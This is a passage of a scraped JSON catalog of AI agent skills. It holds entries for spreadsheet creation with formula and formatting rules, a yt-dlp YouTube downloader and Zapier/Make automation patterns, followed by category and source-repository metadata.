percentages (e.g., \"$#,##0;($#,##0);-\")\n- **Percentages**: Default to 0.0% format (one decimal)\n- **Multiples**: Format as 0.0x for valuation multiples (EV/EBITDA, P/E)\n- **Negative numbers**: Use parentheses (123) not minus -123\n\n### Formula Construction Rules\n\n#### Assumptions Placement\n- Place ALL assumptions (growth rates, margins, multiples, etc.) in separate assumption cells\n- Use cell references instead of hardcoded values in formulas\n- Example: Use =B5*(1+$B$6) instead of =B5*1.05\n\n#### Formula Error Prevention\n- Verify all cell references are correct\n- Check for off-by-one errors in ranges\n- Ensure consistent formulas across all projection periods\n- Test with edge cases (zero values, negative numbers)\n- Verify no unintended circular references\n\n#### Documentation Requirements for Hardcodes\n- Comment or in cells beside (if end of table). Format: \"Source: [System/Document], [Date], [Specific Reference], [URL if applicable]\"\n- Examples:\n  - \"Source: Company 10-K, FY2024, Page 45, Revenue Note, [SEC EDGAR URL]\"\n  - \"Source: Company 10-Q, Q2 2025, Exhibit 99.1, [SEC EDGAR URL]\"\n  - \"Source: Bloomberg Terminal, 8/15/2025, AAPL US Equity\"\n  - \"Source: FactSet, 8/20/2025, Consensus Estimates Screen\"\n\n# XLSX creation, editing, and analysis\n\n## Overview\n\nA user may ask you to create, edit, or analyze the contents of an .xlsx file. You have different tools and workflows available for different tasks.\n\n## Important Requirements\n\n**LibreOffice Required for Formula Recalculation**: You can assume LibreOffice is installed for recalculating formula values using the `recalc.py` script. The script automatically configures LibreOffice on first run\n\n## Reading and analyzing data\n\n### Data analysis with pandas\nFor data analysis, visualization, and basic operations, use **pandas** which provides powerful data manipulation capabilities:\n\n```python\nimport pandas as pd\n\n# Read Excel\ndf = pd.read_excel('file.xlsx')  # Default: first sheet\nall_sheets = pd.read_excel('file.xlsx', sheet_name=None)  # All sheets as dict\n\n# Analyze\ndf.head()      # Preview data\ndf.info()      # Column info\ndf.describe()  # Statistics\n\n# Write Excel\ndf.to_excel('output.xlsx', index=False)\n```\n\n## Excel File Workflows\n\n## CRITICAL: Use Formulas, Not Hardcoded Values\n\n**Always use Excel formulas instead of calculating values in Python and hardcoding them.** This ensures the spreadsheet remains dynamic and updateable.\n\n### ❌ WRONG - Hardcoding Calculated Values\n```python\n# Bad: Calculating in Python and hardcoding result\ntotal = df['Sales'].sum()\nsheet['B10'] = total  # Hardcodes 5000\n\n# Bad: Computing growth rate in Python\ngrowth = (df.iloc[-1]['Revenue'] - df.iloc[0]['Revenue']) / df.iloc[0]['Revenue']\nsheet['C5'] = growth  # Hardcodes 0.15\n\n# Bad: Python calculation for average\navg = sum(values) / len(values)\nsheet['D20'] = avg  # Hardcodes 42.5\n```\n\n### ✅ CORRECT - Using Excel Formulas\n```python\n# Good: Let Excel calculate the sum\nsheet['B10'] = '=SUM(B2:B9)'\n\n# Good: Growth rate as Excel formula\nsheet['C5'] = '=(C4-C2)/C2'\n\n# Good: Average using Excel function\nsheet['D20'] = '=AVERAGE(D2:D19)'\n```\n\nThis applies to ALL calculations - totals, percentages, ratios, differences, etc. The spreadsheet should be able to recalculate when source data changes.\n\n## Common Workflow\n1. **Choose tool**: pandas for data, openpyxl for formulas/formatting\n2. **Create/Load**: Create new workbook or load existing file\n3. **Modify**: Add/edit data, formulas, and formatting\n4. **Save**: Write to file\n5. **Recalculate formulas (MANDATORY IF USING FORMULAS)**: Use the recalc.py script\n   ```bash\n   python recalc.py output.xlsx\n   ```\n6. **Verify and fix any errors**: \n   - The script returns ",
      "tags": [
        "python",
        "xlsx",
        "claude",
        "ai",
        "workflow",
        "template",
        "document",
        "spreadsheet"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:47.431Z"
    },
    {
      "id": "antigravity-xlsx-official",
      "name": "xlsx",
      "slug": "xlsx-official",
      "description": "Comprehensive spreadsheet creation, editing, and analysis with support for formulas, formatting, data analysis, and visualization. When Claude needs to work with spreadsheets (.xlsx, .xlsm, .csv, .tsv, etc) for: (1) Creating new spreadsheets with formulas and formatting, (2) Reading or analyzing dat",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/xlsx-official",
      "content": "\n# Requirements for Outputs\n\n## All Excel files\n\n### Zero Formula Errors\n- Every Excel model MUST be delivered with ZERO formula errors (#REF!, #DIV/0!, #VALUE!, #N/A, #NAME?)\n\n### Preserve Existing Templates (when updating templates)\n- Study and EXACTLY match existing format, style, and conventions when modifying files\n- Never impose standardized formatting on files with established patterns\n- Existing template conventions ALWAYS override these guidelines\n\n## Financial models\n\n### Color Coding Standards\nUnless otherwise stated by the user or existing template\n\n#### Industry-Standard Color Conventions\n- **Blue text (RGB: 0,0,255)**: Hardcoded inputs, and numbers users will change for scenarios\n- **Black text (RGB: 0,0,0)**: ALL formulas and calculations\n- **Green text (RGB: 0,128,0)**: Links pulling from other worksheets within same workbook\n- **Red text (RGB: 255,0,0)**: External links to other files\n- **Yellow background (RGB: 255,255,0)**: Key assumptions needing attention or cells that need to be updated\n\n### Number Formatting Standards\n\n#### Required Format Rules\n- **Years**: Format as text strings (e.g., \"2024\" not \"2,024\")\n- **Currency**: Use $#,##0 format; ALWAYS specify units in headers (\"Revenue ($mm)\")\n- **Zeros**: Use number formatting to make all zeros \"-\", including percentages (e.g., \"$#,##0;($#,##0);-\")\n- **Percentages**: Default to 0.0% format (one decimal)\n- **Multiples**: Format as 0.0x for valuation multiples (EV/EBITDA, P/E)\n- **Negative numbers**: Use parentheses (123) not minus -123\n\n### Formula Construction Rules\n\n#### Assumptions Placement\n- Place ALL assumptions (growth rates, margins, multiples, etc.) in separate assumption cells\n- Use cell references instead of hardcoded values in formulas\n- Example: Use =B5*(1+$B$6) instead of =B5*1.05\n\n#### Formula Error Prevention\n- Verify all cell references are correct\n- Check for off-by-one errors in ranges\n- Ensure consistent formulas across all projection periods\n- Test with edge cases (zero values, negative numbers)\n- Verify no unintended circular references\n\n#### Documentation Requirements for Hardcodes\n- Comment or in cells beside (if end of table). Format: \"Source: [System/Document], [Date], [Specific Reference], [URL if applicable]\"\n- Examples:\n  - \"Source: Company 10-K, FY2024, Page 45, Revenue Note, [SEC EDGAR URL]\"\n  - \"Source: Company 10-Q, Q2 2025, Exhibit 99.1, [SEC EDGAR URL]\"\n  - \"Source: Bloomberg Terminal, 8/15/2025, AAPL US Equity\"\n  - \"Source: FactSet, 8/20/2025, Consensus Estimates Screen\"\n\n# XLSX creation, editing, and analysis\n\n## Overview\n\nA user may ask you to create, edit, or analyze the contents of an .xlsx file. You have different tools and workflows available for different tasks.\n\n## Important Requirements\n\n**LibreOffice Required for Formula Recalculation**: You can assume LibreOffice is installed for recalculating formula values using the `recalc.py` script. The script automatically configures LibreOffice on first run\n\n## Reading and analyzing data\n\n### Data analysis with pandas\nFor data analysis, visualization, and basic operations, use **pandas** which provides powerful data manipulation capabilities:\n\n```python\nimport pandas as pd\n\n# Read Excel\ndf = pd.read_excel('file.xlsx')  # Default: first sheet\nall_sheets = pd.read_excel('file.xlsx', sheet_name=None)  # All sheets as dict\n\n# Analyze\ndf.head()      # Preview data\ndf.info()      # Column info\ndf.describe()  # Statistics\n\n# Write Excel\ndf.to_excel('output.xlsx', index=False)\n```\n\n## Excel File Workflows\n\n## CRITICAL: Use Formulas, Not Hardcoded Values\n\n**Always use Excel formulas instead of calculating values in Python and hardcoding them.** This ensures the spreadsheet remains dynamic and updateable.\n\n### ❌ WRONG - Hardcoding Calculated Values\n```python\n# Bad: Calculating in Python and hardcoding result\ntotal = df['Sales'].sum()\nsheet['B10'] = total  # Hardcodes 5000\n\n# Bad: Computing growth rate in Python\ngrowth = (df.iloc[-1]['Revenue'] - df.iloc[0]['Revenue']) / df.iloc[0]['Revenue']\nsheet['C5'] = growth  # Hardcodes 0.15\n\n# Bad: Python calculation for average\navg = sum(values) / len(values)\nsheet['D20'] = avg  # Hardcodes 42.5\n```\n\n### ✅ CORRECT - Using Excel Formulas\n```python\n# Good: Let Excel calculate the sum\nsheet['B10'] = '=SUM(B2:B9)'\n\n# Good: Growth rate as Excel formula\nsheet['C5'] = '=(C4-C2)/C2'\n\n# Good: Average using Excel function\nsheet['D20'] = '=AVERAGE(D2:D19)'\n```\n\nThis applies to ALL calculations - totals, percentages, ratios, differences, etc. The spreadsheet should be able to recalculate when source data changes.\n\n## Common Workflow\n1. **Choose tool**: pandas for data, openpyxl for formulas/formatting\n2. **Create/Load**: Create new workbook or load existing file\n3. **Modify**: Add/edit data, formulas, and formatting\n4. **Save**: Write to file\n5. **Recalculate formulas (MANDATORY IF USING FORMULAS)**: Use the recalc.py script\n   ```bash\n   python recalc.py output.xlsx\n   ```\n6. **Verify and fix any errors**: \n   - The script returns ",
      "tags": [
        "python",
        "xlsx",
        "claude",
        "ai",
        "workflow",
        "template",
        "document",
        "spreadsheet",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:53.181Z"
    },
    {
      "id": "composio-video-downloader",
      "name": "youtube-downloader",
      "slug": "video-downloader",
      "description": "Download YouTube videos with customizable quality and format options. Use this skill when the user asks to download, save, or grab YouTube videos. Supports various quality settings (best, 1080p, 720p, 480p, 360p), multiple formats (mp4, webm, mkv), and audio-only downloads as MP3.",
      "category": "Creative & Media",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/video-downloader",
      "content": "\n# YouTube Video Downloader\n\nDownload YouTube videos with full control over quality and format settings.\n\n## Quick Start\n\nThe simplest way to download a video:\n\n```bash\npython scripts/download_video.py \"https://www.youtube.com/watch?v=VIDEO_ID\"\n```\n\nThis downloads the video in best available quality as MP4 to `/mnt/user-data/outputs/`.\n\n## Options\n\n### Quality Settings\n\nUse `-q` or `--quality` to specify video quality:\n\n- `best` (default): Highest quality available\n- `1080p`: Full HD\n- `720p`: HD\n- `480p`: Standard definition\n- `360p`: Lower quality\n- `worst`: Lowest quality available\n\nExample:\n```bash\npython scripts/download_video.py \"URL\" -q 720p\n```\n\n### Format Options\n\nUse `-f` or `--format` to specify output format (video downloads only):\n\n- `mp4` (default): Most compatible\n- `webm`: Modern format\n- `mkv`: Matroska container\n\nExample:\n```bash\npython scripts/download_video.py \"URL\" -f webm\n```\n\n### Audio Only\n\nUse `-a` or `--audio-only` to download only audio as MP3:\n\n```bash\npython scripts/download_video.py \"URL\" -a\n```\n\n### Custom Output Directory\n\nUse `-o` or `--output` to specify a different output directory:\n\n```bash\npython scripts/download_video.py \"URL\" -o /path/to/directory\n```\n\n## Complete Examples\n\n1. Download video in 1080p as MP4:\n```bash\npython scripts/download_video.py \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" -q 1080p\n```\n\n2. Download audio only as MP3:\n```bash\npython scripts/download_video.py \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" -a\n```\n\n3. Download in 720p as WebM to custom directory:\n```bash\npython scripts/download_video.py \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" -q 720p -f webm -o /custom/path\n```\n\n## How It Works\n\nThe skill uses `yt-dlp`, a robust YouTube downloader that:\n- Automatically installs itself if not present\n- Fetches video information before downloading\n- Selects the best available streams matching your criteria\n- Merges video and audio streams when needed\n- Supports a wide range of YouTube video formats\n\n## Important Notes\n\n- Downloads are saved to `/mnt/user-data/outputs/` by default\n- Video filename is automatically generated from the video title\n- The script handles installation of yt-dlp automatically\n- Only single videos are downloaded (playlists are skipped by default)\n- Higher quality videos may take longer to download and use more disk space",
      "tags": [
        "python",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:23.325Z"
    },
    {
      "id": "antigravity-zapier-make-patterns",
      "name": "zapier-make-patterns",
      "slug": "zapier-make-patterns",
      "description": "No-code automation democratizes workflow building. Zapier and Make (formerly Integromat) let non-developers automate business processes without writing code. But no-code doesn't mean no-complexity - these platforms have their own patterns, pitfalls, and breaking points.  This skill covers when to us",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/zapier-make-patterns",
      "content": "\n# Zapier & Make Patterns\n\nYou are a no-code automation architect who has built thousands of Zaps and\nScenarios for businesses of all sizes. You've seen automations that save\ncompanies 40% of their time, and you've debugged disasters where bad data\nflowed through 12 connected apps.\n\nYour core insight: No-code is powerful but not unlimited. You know exactly\nwhen a workflow belongs in Zapier (simple, fast, maximum integrations),\nwhen it belongs in Make (complex branching, data transformation, budget),\nand when it needs to g\n\n## Capabilities\n\n- zapier\n- make\n- integromat\n- no-code-automation\n- zaps\n- scenarios\n- workflow-builders\n- business-process-automation\n\n## Patterns\n\n### Basic Trigger-Action Pattern\n\nSingle trigger leads to one or more actions\n\n### Multi-Step Sequential Pattern\n\nChain of actions executed in order\n\n### Conditional Branching Pattern\n\nDifferent actions based on conditions\n\n## Anti-Patterns\n\n### ❌ Text in Dropdown Fields\n\n### ❌ No Error Handling\n\n### ❌ Hardcoded Values\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | critical | # ALWAYS use dropdowns to select, don't type |\n| Issue | critical | # Prevention: |\n| Issue | high | # Understand the math: |\n| Issue | high | # When a Zap breaks after app update: |\n| Issue | high | # Immediate fix: |\n| Issue | medium | # Handle duplicates: |\n| Issue | medium | # Understand operation counting: |\n| Issue | medium | # Best practices: |\n\n## Related Skills\n\nWorks well with: `workflow-automation`, `agent-tool-builder`, `backend`, `api-designer`\n",
      "tags": [
        "api",
        "ai",
        "agent",
        "automation",
        "workflow",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:55.611Z"
    }
  ],
  "categories": [
    {
      "id": "ai-agents",
      "name": "AI & Agents",
      "description": "AI agent development, memory systems, and autonomous workflows.",
      "icon": "bot",
      "count": 78
    },
    {
      "id": "development-code-tools",
      "name": "Development & Code Tools",
      "description": "Tools for building, testing, and deploying software with AI assistance.",
      "icon": "code",
      "count": 70
    },
    {
      "id": "document-processing",
      "name": "Document Processing",
      "description": "Create, edit, and analyze documents including Word, PDF, PowerPoint, and Excel files.",
      "icon": "file-text",
      "count": 67
    },
    {
      "id": "creative-media",
      "name": "Creative & Media",
      "description": "Design, image editing, video processing, and creative content generation.",
      "icon": "palette",
      "count": 44
    },
    {
      "id": "security-systems",
      "name": "Security & Systems",
      "description": "Security analysis, system administration, and forensics.",
      "icon": "shield",
      "count": 36
    },
    {
      "id": "business-marketing",
      "name": "Business & Marketing",
      "description": "Skills for marketing, branding, lead generation, and business operations.",
      "icon": "briefcase",
      "count": 25
    },
    {
      "id": "productivity-organization",
      "name": "Productivity & Organization",
      "description": "File management, task organization, and workflow automation.",
      "icon": "folder",
      "count": 12
    },
    {
      "id": "communication-writing",
      "name": "Communication & Writing",
      "description": "Content creation, writing assistance, and communication tools.",
      "icon": "message-circle",
      "count": 6
    },
    {
      "id": "collaboration-project-management",
      "name": "Collaboration & Project Management",
      "description": "Team collaboration, version control, and project management.",
      "icon": "users",
      "count": 5
    },
    {
      "id": "data-analysis",
      "name": "Data & Analysis",
      "description": "Analyze data, run queries, and generate insights from various data sources.",
      "icon": "bar-chart",
      "count": 1
    }
  ],
  "sources": [
    {
      "name": "Superpowers",
      "url": "https://github.com/obra/superpowers",
      "skillCount": 14,
      "newSkillCount": 0,
      "stars": 38348
    },
    {
      "name": "Anthropic",
      "url": "https://github.com/anthropics/skills",
      "skillCount": 15,
      "newSkillCount": 1,
      "stars": 56183
    },
    {
      "name": "ComposioHQ",
      "url": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillCount": 19,
      "newSkillCount": 8,
      "stars": 27065
    },
    {
      "name": "OpenHands",
      "url": "https://github.com/OpenHands/OpenHands",
      "skillCount": 25,
      "newSkillCount": 0,
      "stars": 67186
    },
    {
      "name": "Awesome LLM",
      "url": "https://github.com/Prat011/awesome-llm-skills",
      "skillCount": 25,
      "newSkillCount": 0,
      "stars": 767
    },
    {
      "name": "Antigravity",
      "url": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillCount": 246,
      "newSkillCount": 11,
      "stars": 4568
    }
  ],
  "lastUpdated": "2026-01-28T06:47:47.581Z",
  "stats": {
    "totalSkills": 344,
    "newSkills": 20,
    "scrapedAt": "2026-01-28T06:47:47.581Z"
  }
}